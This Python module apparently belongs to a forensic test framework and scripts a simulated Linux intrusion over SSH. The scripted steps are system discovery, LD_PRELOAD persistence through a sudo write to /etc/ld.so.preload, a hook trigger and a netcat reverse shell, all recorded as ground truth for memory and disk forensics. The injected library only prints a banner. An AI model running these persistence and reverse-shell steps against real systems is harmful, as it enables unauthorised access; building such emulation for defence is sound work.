"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user. They perform
system discovery, compile a malicious shared library, write it to
/etc/ld.so.preload, then trigger the hook by spawning a new process. A reverse
shell is established from inside that hooked process, leaving the .so mapped in
memory. Cleanup optionally reverts the scenario-owned disk changes.

Steps
-----
1. T1082        -- scenario-owned system info collection -> /tmp/T1082.txt
2. T1574.006    -- scenario-owned compile .so + write /etc/ld.so.preload
3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
5. cleanup only when run_cleanup=True: delete the discovery output and unhook
   /etc/ld.so.preload via sed. The trigger and reverse shell have no cleanup.
   Recorded as a single "cleanup" step.

Forensic artifacts
------------------
Disk:
  /etc/ld.so.preload   written by step 2; unhooked (emptied) by cleanup
  /tmp/T1574006.so     compiled .so; NOT removed by cleanup -- persists
  /tmp/scenario_01_ldpreload/T1574.006.c source used to compile the .so
  /tmp/T1082.txt       discovery output; deleted by cleanup (T1070.004 tombstone)

Memory:
  any process spawned after step 2 has /tmp/T1574006.so mapped
  reverse shell process: open TCP socket + /tmp/T1574006.so in maps
  (memory mappings outlive the disk cleanup)

Locators contract
-----------------
Each step that plants an artifact records the planted values under a "locators"
sub-dict with stable keys (e.g. ldpreload -> so_path/preload_path, reverse_shell
-> fifo/port). These are intent (what the attack put there), kept distinct from
the observed facts (so_loaded, trigger_pid, connected, ...) recorded alongside.
Paths are owned by the framework. ART is intentionally not part of this
multi-step scenario; it is only used by the separate art_calibration baseline.

Ground-truth shape
------------------
The orchestrator pre-builds `ground_truth = {"scenario_id": ..., "steps": []}`
and passes it in. run() appends per-step dicts to ground_truth["steps"]; the
orchestrator persists the dict in a finally clause so partial runs survive a
mid-scenario exception.
"""

from __future__ import annotations
from typing import Any

from orchestrator.attacks.helpers import run_reverse_shell
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient
from orchestrator.evaluation.scenario.scenario_01 import (
    DISCOVERY_OUTPUT,
    EVENTS_BY_STEP,
    PRELOAD_PATH,
    RS_FIFO,
    RS_PORT,
    SO_PATH,
    SRC_PATH,
    EventCtx,
    record_event,
)


# --- public entry point -------------------------------------------------


def run(
    ssh: SSHClient,
    runner: Any,
    host_ip: str,
    internet_on,
    internet_off,
    ground_truth: dict[str, Any],
    *,
    run_cleanup: bool = False,
    gt_builder=None,
) -> None:
    # gt_builder is optional and additive: when present, each seeded action is
    # also recorded into the GT-blind pipeline's gt_manifest with wall-clock time
    # at execution. ART is not used here; this scenario owns its attack commands.
    params = gt_builder.params if gt_builder is not None and gt_builder.seed else None
    fifo = f"/tmp/.{params.token()}" if params is not None else RS_FIFO
    port = params.port() if params is not None else RS_PORT

    # Drive the attacker's commands through one interactive login shell so they
    # are typed into ~/.bash_history, the way a real intrusion leaves them. The
    # reverse shell stays on the exec path (no PTY) so its backgrounded job
    # survives the channel closing.
    ssh.open_shell()
    steps = ground_truth["steps"]

    ctx = EventCtx(
        cleanup=run_cleanup,
        discovery_output=DISCOVERY_OUTPUT,
        so_path=SO_PATH,
        src_path=SRC_PATH,
        socket_value=f"{host_ip}:{port}",
        fifo=fifo,
    )

    def _record(step: str) -> None:
        if gt_builder is not None:
            record_event(gt_builder, EVENTS_BY_STEP[step], ctx)

    try:
        console.step_header("[1/4] discovery")
        discovery = _run_discovery(ssh)
        steps.append(discovery)
        _record("E1_discovery_os_info")

        console.step_header("[2/4] LD_PRELOAD infection")
        ldpreload = _install_ldpreload(ssh)
        steps.append(ldpreload)
        _record("E2_ldpreload_persistence")
        _record("E2_ldpreload_payload")

        console.step_header("[3/4] LD_PRELOAD hook trigger")
        steps.append(_trigger_hook(ssh))
        _record("E3_ldpreload_triggered")

        console.step_header("[4/4] reverse shell")
        # keep_open=True leaves the socket ESTABLISHED with nc resident through
        # memory acquisition, so linux.sockstat recovers it (sockscan still backs
        # up the post-mortem CLOSE case when run with keep_open=False).
        run_reverse_shell(ssh, host_ip, steps, port=port, fifo=fifo, keep_open=True)
        _record("E4_reverse_shell")
        _record("E4_reverse_shell_fifo")

        if run_cleanup:
            console.step_header("cleanup")
            _run_cleanup(ssh, steps)
            _record("E5_discovery_deleted")
        else:
            console.step_header("cleanup (skipped: artifacts preserved)")
    finally:
        # Flush the typed commands to ~/.bash_history even if a step raised, so
        # the partial-run disk image still carries the history artifact.
        ssh.close_shell()


# --- scenario-local helpers ---------------------------------------------


_PRELOAD_SOURCE = r"""
#include <stdio.h>

static void init(int argc, char **argv, char **envp) {
    printf("Loaded Scenario 01 preload library successfully!\n");
}

static void fini(void) {
    printf("Unloading Scenario 01 preload library...\n");
}

__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;
""".strip()


def _run_discovery(ssh: SSHClient) -> dict[str, Any]:
    cmd = (
        f"mkdir -p /tmp/scenario_01_ldpreload; "
        f"uname -a > {DISCOVERY_OUTPUT}; "
        f"cat /etc/os-release >> {DISCOVERY_OUTPUT} 2>/dev/null || true; "
        f"uptime >> {DISCOVERY_OUTPUT}"
    )
    code, out = ssh.run_shell(cmd, timeout=15)
    return {
        "step": "discovery",
        "technique": "T1082",
        "exit_code": code,
        "stdout": out,
        "stderr": "",
        "locators": {"output_path": DISCOVERY_OUTPUT},
    }


def _install_ldpreload(ssh: SSHClient) -> dict[str, Any]:
    source = _shell_single_quote(_PRELOAD_SOURCE)
    cmd = (
        f"mkdir -p /tmp/scenario_01_ldpreload && "
        f"printf %s {source} > {SRC_PATH} && "
        f"gcc -shared -fPIC -o {SO_PATH} {SRC_PATH} && "
        f"sudo sh -c 'echo {SO_PATH} > {PRELOAD_PATH}'"
    )
    code, out = ssh.run_shell(cmd, timeout=30)
    if code != 0:
        raise RuntimeError(f"LD_PRELOAD install failed: {out.strip()}")
    return {
        "step": "ldpreload",
        "technique": "T1574.006",
        "exit_code": code,
        "stdout": out,
        "stderr": "",
        "locators": {
            "so_path": SO_PATH,
            "source_path": SRC_PATH,
            "preload_path": PRELOAD_PATH,
        },
    }


def _run_cleanup(ssh: SSHClient, steps: list[dict[str, Any]]) -> None:
    cmd = (
        f"rm -f {DISCOVERY_OUTPUT}; "
        f"sudo sed -i 's#{SO_PATH}##' {PRELOAD_PATH}"
    )
    code, out = ssh.run_shell(cmd, timeout=15)
    steps.append(
        {
            "step": "cleanup",
            "technique": "T1070.004",
            "exit_code": code,
            "stdout": out,
            "stderr": "",
            "reverted": ["T1082", "T1574.006"],
            "run": True,
        }
    )


def _shell_single_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    # Typed through the interactive shell (run_shell) so the trigger and the
    # /proc maps check are recorded in ~/.bash_history alongside the rest of the
    # session. printf-framed output carries the pid as the last token.
    cmd = "sh -c 'sleep 300 >/dev/null 2>&1 & echo $!'"
    code, out = ssh.run_shell(cmd, timeout=10)
    # The preloaded .so prints a banner from its constructor, so stdout is the
    # banner followed by the pid: take the last token and require it be numeric.
    tokens = out.split()
    pid = tokens[-1] if tokens and tokens[-1].isdigit() else None
    if pid is None:
        return {
            "step": "ldpreload_trigger",
            "technique": "T1574.006",
            "exit_code": code,
            "trigger_pid": None,
            "so_loaded": False,
            "maps_excerpt": "",
            "error": f"could not parse pid from trigger output: {out.strip()!r}",
        }
    _, maps_out = ssh.run_shell(f"grep T1574006.so /proc/{pid}/maps", timeout=10)
    # run_shell does not capture exit status in vanilla mode, so judge the hook
    # from the grep output: real maps lines naming the .so (the echoed command
    # is stripped by run_shell, so it cannot false-positive here).
    maps_lines = [ln for ln in maps_out.splitlines() if "T1574006.so" in ln]
    loaded = bool(maps_lines)
    return {
        "step": "ldpreload_trigger",
        "technique": "T1574.006",
        "exit_code": code,
        "trigger_pid": pid,
        "so_loaded": loaded,
        "maps_excerpt": "\n".join(maps_lines),
    }
